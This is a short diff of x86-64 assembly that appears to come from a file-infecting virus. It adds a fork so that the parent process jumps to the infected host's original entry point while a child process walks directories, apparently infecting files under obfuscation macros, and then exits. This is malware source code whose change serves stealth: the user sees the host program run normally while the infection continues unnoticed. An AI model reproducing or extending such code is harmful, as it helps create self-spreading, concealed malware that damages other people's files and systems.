@@ -1064,6 +1064,13 @@ main:
 	cmp rax, 1
 	je jmp_old_entry
 	OBF
+
+	JNK2
+	SYS_NUM sys_fork
+	syscall
+	cmp rax, 0
+	jne jmp_old_entry
+
 	lea rdi, [rel dir1]
 	BIG_OBF
 	lea rsi, [rel process_file]
@@ -1073,7 +1080,8 @@ main:
 	lea rsi, [rel process_file]
 	BIG_OBF
 	call process_dir
-	jmp jmp_old_entry
+	SYS_NUM sys_exit
+	syscall
 
 ret_0:
 	mov rax, 0
